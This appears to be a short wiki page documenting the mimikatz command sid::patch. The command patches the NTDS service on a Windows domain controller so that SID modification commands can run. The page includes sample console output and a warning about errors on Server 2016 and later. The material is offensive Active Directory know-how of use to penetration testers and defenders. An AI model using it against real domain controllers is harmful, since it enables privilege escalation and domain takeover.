# patch

{% hint style="danger" %}
Attempting `sid::patch` on a Windows domain controller 2016 and above will result in the following error.

```
mimikatz # sid::patch
Patch 1/2: "ntds" service patched
Patch 2/2: ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000057)
```

[Dliv3](https://github.com/Dliv3) has [reported](https://github.com/gentilkiwi/mimikatz/issues/348) a similar situation on a Windows Server 2019.&#x20;

_At the time of writing (January 13th, 2023), there is no known fix to this._&#x20;
{% endhint %}

`sid::patch` can be used to patch the NTDS (NT Directory Services). It's useful when running [`sid::modify`](modify.md) or [`sid::add`](add.md).

```
mimikatz # sid::patch
Patch 1/2: "ntds" service patched
Patch 2/2: "ntds" service patched
```
